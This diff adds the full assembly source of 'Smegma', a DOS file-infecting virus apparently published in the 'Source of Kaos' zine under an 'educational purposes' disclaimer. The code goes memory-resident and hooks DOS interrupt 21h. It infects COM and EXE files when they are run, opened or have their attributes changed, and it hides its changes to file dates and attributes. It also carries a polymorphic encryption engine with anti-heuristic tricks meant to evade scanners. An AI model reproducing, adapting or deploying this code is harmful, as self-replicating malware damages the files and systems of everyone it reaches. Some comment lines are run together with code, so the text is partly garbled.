@@ -1,0 +1,874 @@
+;
+;                          |- Source of Kaos -|
+;                          |-    Issue #2    -|
+;
+; Disclaimer:
+; This source code is provided educational purposes.  SOK takes no
+; responsiblity for how this source code is used.
+;
+;
+;                               Smegma
+;                               By
+;                               Yosha
+;
+; features:
+; * - Able to use upper memory.
+; * - Com/Exe infection on exec, open, attrib.
+; * - Dos 7 Com files work correctly.
+; * - Polymorphic, uses Dumb Oversized Poop Engine (DOPE). - exprimental engine
+;                  It sucks, but ;    it's a start.
+
+; assemble as an EXE with Tasm, then use exe2bin to convert it to a COM.
+; Or ;just use a86.
+
+.model tiny
+.code
+.286
+code_length equ offset finish - offset start 
+paragraphs  equ (((code_length+15)/16)*2)+100 org 0h
+
+start:
+;get ip
+        call    $+3
+        pop     bp
+        sub     bp,3
+patch_this equ $ - 2
+;do res check
+        cld
+        mov     ax,'ZZ'
+        int     21h
+        cmp     ax,'GO'
+        jne     install
+restore:
+        push    cs
+        pop     ds
+        lea     si,[bp+offset saved_csip] ;check whether com or exe, so we know how to reexecute the host        
+        mov     ah,62h
+        int     21h
+        mov     ax,cs
+        cmp     bx,ax
+        push    bx
+        mov     es,bx
+        je      com_restore
+;adjust base ss and cs by psp segment
+        add     bx,10h
+        add     word ptr [si+2],bx              ;adjust cs
+        add     word ptr [si+4],bx              ;adjust ss
+        pop     ds
+        mov     sp,word ptr cs:[si+6]
+        mov     ss,word ptr cs:[si+4]
+        call    zero_registers
+                db      0eah
+saved_csip:
+        db      0ceh,020h
+        nop
+        nop
+saved_sssp      dd      ?
+
+com_restore:
+        pop     ds
+        
+        push    100h
+        pop     di
+        push    di
+        lodsw
+        dec     ax      ;first bytes are 1 higher from infection routine
+        stosw
+        movsw
+               
+zero_registers:
+;pushes 8 word sized 0h's        
+        xor     ax,ax
+        mov     cx,8
+        push    ax
+        loop    $ - 1
+;then pops them into all registers, excluding sp.         
+        popa
+        ret
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;                       Go Resident in UMBs ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; install:
+;get list of lists
+        mov     ah,52h
+        int     21h
+;point es:di to disk buffer
+        les     di,dword ptr es:[bx+12h] ;get first segment of upper mem.  Test if it's ffffh, meaning not available.
+        mov     ax,word ptr es:[di+1fh]
+        inc     ax
+        jz      go_low
+        dec     ax
+        xor     di,di
+umb_search_loop:
+        mov     es,ax
+;check if block is free        
+        cmp     word ptr es:[di+1],di
+        jne     search_again
+;check if it's big enough
+        mov     cx,paragraphs*2
+        cmp     word ptr es:[di+3],cx
+        jg      found_space
+search_again:
+        mov     cl,'Y'
+        inc     cx
+        cmp     byte ptr es:[di],cl
+        je      go_low
+        add     ax,word ptr es:[di+3]
+        inc     ax
+        jmp     umb_search_loop
+found_space:
+        push    es
+;steal the M or the Z at the beginning of the block        
+        mov     bl,'L'
+        inc     bx
+        xchg    bl,byte ptr es:[di]
+;take the block size too
+        xchg    cx,word ptr es:[di+3]
+;set the block as owned by dos
+        mov     word ptr es:[di+1],8
+;set name to System Code
+        push    ax
+        mov     di,8
+        mov     ax,'CS'
+        stosw
+        xor     ax,ax
+        stosw
+        stosw
+        stosw
+        pop     ax
+        xor     di,di
+;now move after the block 
+        add     ax,(paragraphs*2)+1
+        mov     es,ax
+;put down the M or Z we snatched
+        mov     byte ptr es:[di],bl
+;set it as free
+        mov     word ptr es:[di+1],di
+;set size of block
+        sub     cx,(paragraphs*2)+1
+        mov     word ptr es:[di+3],cx
+;now move back to where we were
+        pop     ax
+        inc     ax
+;copy the virus' code        
+copy_code:       
+        mov     es,ax
+        mov     si,bp
+        mov     cx,code_length
+        push    cs
+        pop     ds
+        rep     movsb
+;hook int 21h
+        mov     ds,cx
+        mov     si,21h*4
+        mov     di,offset old21
+        movsw
+        movsw
+        mov     word ptr [si-4],offset int_21_handler
+        mov     word ptr [si-2],es
+jmp_restore:
+        jmp     restore        
+;get down to MCB
+go_low:        
+        mov     ah,62h
+        int     21h
+        dec     bx
+        mov     ds,bx
+;make sure it's a Z block
+        xor     si,si
+        mov     al,byte ptr [si]
+        not     al
+        cmp     al,not 'Z'
+        jne     jmp_restore
+;cut off 4k
+        mov     bx,100h
+        sub     word ptr [si+3],bx
+;cut off 4k in psp
+        add     si,12h
+        sub     word ptr [si],bx
+;get top of memory
+        mov     ax,word ptr [si]
+        xor     di,di
+        jmp     copy_code
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+        
+
+;a text string can't hurt
+message db      " [Smegma] by Yosha " 
+newbytes:
+        cld
+        db      0e9h,0,0
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;                               Int 21h Handler ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; int_21_handler:
+        xchg    ah,al           ;cmp al is smaller and doesn't generate flags
+        
+        cmp     ax,'ZZ'
+        jne     $+6
+        mov     ax,'GO'
+        iret
+        
+        cmp     al,43h          ;attrib?
+        je      infect
+
+        cmp     al,3dh          ;open?
+        je      infect
+
+        cmp     ax,004bh        ;execute?
+        je      infect
+exit_21:
+        xchg    ah,al
+        db      0eah
+old21   dd      ?
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;                       Infection Routine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+infect: 
+;find end of asciz string        
+        pusha
+        mov     si,dx
+        cld
+        
+        lodsb
+        or      al,al
+        jnz     $ - 3
+;load last 2 characters into ax, make 'em lower case, make sure it's a good ;extension
+        mov     ax,word ptr [si-3]
+        or      ax,2020h        
+        cmp     ax,'ex'
+        je      $+5
+        cmp     ax,'mo'
+        popa
+        jne     exit_21
+
+        pusha
+        push    es
+        push    ds
+;get attributes
+        mov     al,43h
+        xor     cx,cx
+        call    call_21
+;clear them
+        mov     ax,0143h
+        pusha           ;save cx and ax
+        xor     cx,cx
+        call    call_21
+;open file, read/write
+        mov     ax,023dh       
+        call    call_21
+        xchg    bx,ax
+;save date and time        
+        mov     ax,0057h
+        push    ax
+        call    call_21
+        push    dx
+        push    cx
+;read from it
+        push    cs
+        pop     ds
+        mov     al,3fh
+        mov     cx,28
+        mov     dx,offset readbuffer
+        call    call_21
+;separate com files from exe's
+        push    cs
+        pop     es
+        mov     si,dx
+        lodsw
+        inc     ax              ;anti heuristics fun
+        cld
+        cmp     ax,'ZM'+1
+        je      exe_infect
+        cmp     ax,'MZ'+1
+        jne     com_infect
+exe_infect:
+        call    exeroutine      ;more organized this way
+        jmp     close_it
+com_infect:
+;now check for infection
+        cmp     ax,0e9fdh       ;cld/jmp
+        je      close_it
+;store old bytes.  First 2 bytes are 1 higher from the inc.  The restore ;routine will correct that.
+        mov     di,offset saved_csip
+        stosw
+        movsw
+;check if it's too big or too small
+        call    mov2eof
+        cmp     ah,0f0h                 
+        jae     close_it
+        cmp     ah,2
+        jbe     close_it
+;construct a jump.
+        sub     ax,4
+        mov     word ptr [newbytes+2],ax ;call DOPE
+;bp=new ip, ds:si -> virus
+        add     ax,104h
+        xchg    bp,ax
+        xor     si,si
+        push    bx
+        call    poly
+        pop     bx
+        pusha
+;move to eof - 7.  This shit is ENUNS com files work, whatever those are
+        mov     ax,242h
+        mov     cx,-1
+        mov     dx,-7
+        call    call_21
+;read in last 7 bytes        
+        mov     al,3fh
+        mov     cx,7
+        mov     dx,di
+        call    call_21        
+;write virus to end of file                
+        popa
+        add     cx,7
+        add     word ptr [di+5],cx              ;enuns files work now
+        mov     al,40h
+        call    call_21
+;now go to the beginning of the file
+        call    mov2sof
+;write new header
+        mov     al,40h
+        mov     dx,offset newbytes
+        mov     cl,4
+        call    call_21
+close_it:        
+;restore date and time        
+        pop     cx
+        pop     dx
+        pop     ax
+        inc     ah
+        call    call_21
+;close file
+        mov     al,3eh
+        call    call_21
+exit_infect:
+;restore attributes        
+        popa
+        pop     ds
+        pop     es
+        mov     ax,0143h
+        call    call_21
+;ok we're done
+        popa
+        jmp     exit_21
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;                               Subroutines ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; call_21:
+        pushf
+        push    cs
+        push    offset return
+        jmp     exit_21
+return:
+        ret
+mov2sof:
+        xor     ah,ah
+        jmp     $+4
+mov2eof:
+        mov     ah,2
+        xor     cx,cx
+        cwd
+movptr:
+        mov     al,42h
+        call    call_21
+        ret
+crappy_exe2:
+        pop     ax
+        pop     dx
+        ret
+exeroutine:
+;go to end of file
+        dec     si
+        dec     si
+        call    mov2eof
+        push    dx
+        push    ax
+;check and make sure maxmem = ffffh        
+        mov     ax,word ptr [si+0ch]
+        inc     ax
+        jnz     crappy_exe2
+;make sure overlay number is 0
+        cmp     word ptr [si+1ah],ax
+        jne     crappy_exe2
+;make sure it's uninfected
+        mov     ax,'LT'
+        cmp     word ptr [si+12h],ax
+        je      crappy_exe2
+;set it as infected        
+        mov     word ptr [si+12h],ax
+;make sure it's not a NewEXE
+        cmp     word ptr [si+18h],40h
+        je      crappy_exe2
+;internal overlays are evil creatures
+        pop     ax
+        pop     dx
+        pusha
+        mov     ch,2
+        div     cx
+        inc     ax
+        cmp     ax,word ptr [si+4]
+        popa
+        jne     crappy_exe
+;save handle, convert header to bytes
+        push    bx
+        mov     bx,word ptr [si+8]
+        shl     bx,4
+;subtract header size from file size
+        xor     cx,cx
+        sub     ax,bx
+        sbb     dx,cx
+        pop     bx
+;find new cs, remainder being in dx
+        add     cl,10h
+        div     cx
+;copy old cs:ip into buffer        
+        push    si
+        add     si,14h
+        mov     di,offset saved_csip
+        movsw
+        movsw
+;copy old ss:sp into buffer     
+        sub     si,(18h-0eh)
+        movsw
+        movsw
+;change cs:ip
+        pop     si
+        push    si
+        mov     word ptr [si+14h],dx 
+        mov     word ptr [si+16h],ax
+        push    ax
+;call DOPE.  
+        mov     bp,dx
+        mov     ax,1
+        xor     si,si
+        push    bx
+        call    poly
+        pop     bx
+;change ss:sp
+        pop     ax
+        pop     si
+        add     ax,cx
+        add     ax,20h
+        mov     word ptr [si+0eh],ax            ;avoids 'K' flag
+        mov     word ptr [si+010h],0            ;set sp to zero for file ;adjust minimum paragraphs - leave lots of room for the poly
+        add     word ptr [si+0ah],ax
+;write the virus code to the file
+        mov     al,40h                          ;write to file     
+        call    call_21
+;move to the end of the file
+        call    mov2eof
+;recalculate length or something
+        mov     ch,2 
+        div     cx
+;adjust minimum pages  
+        inc     ax      
+        mov     word ptr [si+4],ax
+;set remainder after dividing 
+        mov     word ptr [si+2],dx
+;move the pointer to the beginning of the file
+        call    mov2sof
+;write the modified header in
+        mov     al,40h
+        mov     cx,28
+        mov     dx,si
+        call    call_21
+crappy_exe:
+        ret
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;                          Dumb Oversized Poop Engine (DOPE) ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ;Entry:
+; si -> virus code
+; code_length = size of virus in bytes
+; bp = offset code will be executed at
+; if ax = 1 then a push cs/pop ds comes before the first real instruction ;  (for exe's, duh)
+; when engine is called, assumes ds=es=cs ;Return:
+; dx -> encrypted virus
+; di -> end of encrypted virus
+; cx = size of encrypted code
+poly:
+;save some registers   
+   push  si
+;clear some counters, set up some registers
+   mov   di,offset buffer - 2
+   mov   si,di
+   xchg  bx,ax
+   xor   ax,ax
+   stosw
+   cld
+   
+
+;this part makes the encryption instruction
+   dec   bx
+   jnz   not_exe
+;put down the push cs, then make some junk so it can't be scanned for as ;easily
+   call  make_junk
+   mov   al,0
+   org   $ - 1
+   push  cs
+   stosb
+   call  make_junk
+;now put down the pop ds and update the length counter
+   mov   al,0
+   org   $ - 1
+   pop   ds
+   stosb
+   add   word ptr [si],2
+not_exe:
+   call  make_junk
+   call  random
+   and   al,11b
+   cmp   al,3
+   je    $ - 7
+   push  ax
+;this makes the decryption instruction   
+   mov   bx,offset methods
+   xlat
+;and put down 80h + byte we grabbed   
+   mov   ah,80h
+   xchg  ah,al
+   stosw
+;skip 2 bytes, save offset (patch this later)
+   mov   word ptr [encrypt_ptr],di
+   scasw
+;now make an encryption value, save it, put it down
+   call  random
+   or    al,al          ;don't allow 0h crypt val
+   jz    $ - 5
+   mov   byte ptr [encrypt_val],al
+   stosb
+;this patches the encryptor in the engine with the appropriate instruction
+   pop   ax
+   mov   bx,offset methods+3
+   xlat
+   mov   byte ptr [encrypt_loop+1],al
+
+
+;this part makes the counter increment instruction of the decryptor, ie ;inc word ptr [xxxx].  It can also do add word ptr [xxxx],1 and sub word ptr ;[xxxx],0ffffh
+   call  make_junk
+   call  random
+   and   al,1
+   jz    normal_inc
+
+   call  random
+   mov   cx,1
+   and   al,1
+   jz    add_counter
+   neg   cx
+add_counter:
+   mov   bx,offset add_sub
+   xlat
+   mov   ah,81h
+   xchg  ah,al
+   stosw
+   mov   dx,1
+   jmp   $+7
+normal_inc:   
+   cwd
+   mov   ax,06ffh    ;inc word ptr [xxxx]
+   stosw
+   
+   ;tasm won't assemble this
+   ;lea   ax,[bp-offset buffer]
+   db    8dh,86h                        ;lea ax,[bp+
+   dw    offset start - offset buffer   ;-offset buffer
+
+   add   ax,word ptr [encrypt_ptr]
+   mov   word ptr [adjusted_ptr],ax
+   stosw
+   dec   dx
+   jnz   skip_this_poop
+   
+   xchg  cx,ax
+   stosw
+   add   word ptr [si],2
+skip_this_poop:   
+
+
+;this part makes the cmp word ptr [xxxx],offset end_encrypt instruction.  
+   call  make_junk
+   mov   ax,3e81h
+   stosw
+   mov   ax,word ptr [adjusted_ptr]
+   stosw
+;skip these 2 bytes for now   
+   mov   word ptr [cmp_ptr],di
+   scasw
+   
+   
+;this is the part that loops back.  It uses jne/jb or push offset enc_loop ;and ret if the code size is too much
+   call  random
+   and   al,11b
+   cmp   al,11b
+   je    $ - 7
+   mov   bx,offset jumpers
+   mov   cl,al
+   xlat
+   stosb
+;2 for the jump, 6 for the cmp, 4 for the inc, 5 for the encrypt ;instruction   
+   mov   ax,word ptr [si]
+   add   ax,17
+   cmp   ax,120
+   ja    push_loop
+   neg   ax
+   stosb
+   jmp   done_poly
+;if the jump offset is too big it uses the 286 + instruction push offset ;then some junk, then a ret.
+push_loop:
+;convert the jump
+   dec   di
+   mov   bx,offset jumpers+3
+   xchg  cx,ax
+   xlat
+   stosb
+   push  di
+   inc   di
+   mov   al,68h
+   stosb
+   mov   ax,word ptr [adjusted_ptr]
+   dec   ax
+   dec   ax
+   stosw
+   call  make_junk
+   mov   al,0c3h
+   stosb
+   mov   ax,di
+   pop   bx
+   sub   ax,bx
+   dec   ax
+   mov   byte ptr [bx],al
+   add   word ptr [si],4
+   
+done_poly:
+   call  make_junk
+;patch the xor word ptr [xxxx]   
+   mov   ax,di
+   sub   ax,offset buffer
+   mov   dx,ax
+   add   ax,bp
+   mov   si,word ptr [encrypt_ptr]
+   mov   word ptr [si],ax
+;patch yyyy in cmp word ptr [xxxx],yyyy
+   mov   si,word ptr [cmp_ptr]
+   push  ax
+   call  random
+   and   ax,15             ;pad it by up to 15 bytes
+   inc   ax                ;but always at least one cuz a jz requires it
+   pop   bx
+   add   ax,bx
+   mov   cx,code_length
+   add   ax,cx
+   mov   word ptr [si],ax
+;copy virus' code after decryptor        
+   pop   si
+   push  cx
+   push  di
+   rep   movsb
+;and the value        
+   mov   al,byte ptr [encrypt_val]
+   mov   byte ptr [encrypt_loop+2],al
+   pop   si
+   pop   cx
+   add   dx,cx
+   int   3       ;clear prefetch
+encrypt_loop:
+   db    80h,0,0
+   inc   si
+   loop  encrypt_loop
+;done!
+   mov   cx,offset buffer
+   xchg  dx,cx
+   ret
+
+
+
+make_junk:
+;check if we should make some junk
+   call  random
+   and   al,111b
+   jz    return_us
+;call the randomly selected routine   
+   call  random   
+   and   ax,1110b
+   mov   bx,offset where_to_go
+   add   bx,ax
+   call  word ptr [bx]
+   jmp   make_junk
+return_us:
+   ret
+
+make_immediate:
+   mov   dl,1
+   jmp   $+4
+make_two_byte:
+;shitty 2 byte reg,reg instructions
+   xor   dl,dl
+   call  random
+   and   al,15
+   cmp   al,10
+   ja    $ - 7
+   mov   bx,offset two_bytes
+   xlat
+   push  ax
+;separate the immediates from the 2 byters based on the dl flag
+   cmp   dl,1
+   jne   its_2
+   
+   call  random
+   and   al,1
+   xchg  dx,ax
+   pop   cx
+   cmp   cl,84h
+   jae   make_immediate
+   add   cl,4
+   xchg  cx,ax
+   stosb
+
+   cmp   dl,1
+   jz    poooooo
+   inc   byte ptr [di-1]
+   call  random
+   stosb
+   inc   word ptr [si]
+poooooo:
+   in    al,40h
+   stosb
+   add   word ptr [si],2
+   ret
+its_2:
+   call  random      
+   pop   cx
+   and   al,1
+   add   cl,al
+   xchg  cx,ax
+   stosb
+;no sp check needed for 8 bit reg,reg instructions        
+   or    al,al
+   jz    $+5
+   call  get_mask
+;makes it [instruction] reg,reg        
+   or    al,11000000b
+   stosb
+   add   word ptr [si],2        
+   ret
+
+
+;reach from the virus' ass, pull out a turd, and throw it on the decryptor make_one_byte:
+;get 1 of the 3 instructions - xchg, inc, or dec
+   call  random
+   and   al,11b
+   cmp   al,11b
+   jz    $ - 7
+   mov   bx,offset one_byte
+   xlat
+   push  ax     
+;now give it 2 registers and throw it down         
+   call  get_mask
+   pop   cx
+   and   al,111b
+   or    cl,al
+   xchg  cx,ax
+   stosb
+   inc   word ptr [si]
+   ret
+
+
+make_21_function2:
+   mov   dl,1
+   jmp   $+4
+make_21_function:
+   xor   dl,dl
+   mov   al,0b8h
+   cmp   dl,1
+   jne   $+4
+   mov   al,0b4h
+   stosb
+   call  random
+   and   al,13
+   cmp   al,16
+   ja    $ - 7
+   mov   bx,offset int_21
+   xlat
+   cmp   dl,1
+   je    $+3
+   scasb
+   stosb
+   mov   ax,21cdh
+   stosw
+   mov   al,5
+   cmp   dl,1
+   jne   $+3
+   dec   ax
+   cbw
+   add   word ptr [si],ax
+   ret
+
+make_one_byte_shit:
+   call  random
+   and   al,7
+   mov   bx,offset junk
+   xlat
+   stosb
+   inc   word ptr [si]
+   ret
+
+
+;this makes random registers but weeds out those with sp get_mask:
+   call  random      
+;make sure sp is not one of the registers
+   push  ax
+   and   al,111b        ;only check destination reg, last 3 bits
+   cmp   al,100b        ;sp?
+   pop   ax
+   je    get_mask
+   push  ax
+   and   al,111000b     ;weed out sp for 1 byte instructions
+   cmp   al,100000b     ;you won't see an sp at all in fact
+   pop   ax
+   je    get_mask       ;then redo it
+   ret                  ;otherwise leave
+
+random:
+   sti
+   in    ax,40h
+   neg   al
+   rol   al,3
+   xor   al,ah
+   not   al
+   mov   bx,offset previous
+   xor   al,byte ptr [bx]
+   mov   byte ptr [bx],al
+   ret
+
+junk:
+   clc
+   stc
+   cbw
+   cwd
+   sti
+   cli
+   std
+   cld
+
+int_21   db 0bh,18h,1dh,1eh,20h,2ch,2fh,30h,34h,35h,4dh,51h,52h
+         db 62h,6bh
+add_sub  db 06h,2eh
+methods  db 06h,2eh,36h    ;put in decryptor (add/sub/xor)
+         db 2ch,04h,34h    ;for encryptor    (sub/add/xor) jumpers  db 72h,75h,76h
+         db 73h,74h,77h
+one_byte    db 40h,90h,48h
+two_bytes   db 00h,08h,10h,18h,20h,28h,30h,38h,84h,86h,88h where_to_go dw make_one_byte,make_two_byte,make_21_function
+            dw make_21_function2,make_immediate,make_two_byte
+            dw make_one_byte_shit,make_two_byte ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; finish:
+readbuffer     db 28 dup (?)
+previous       db ?
+encrypt_val    db ?
+adjusted_ptr   dw ?
+encrypt_ptr    dw ?           ;contains offset that needs to be patched later cmp_ptr        dw ?           ;ditto
+size_of_code   dw ?           ;to see if the jump is too big buffer         label near  
+   end   start
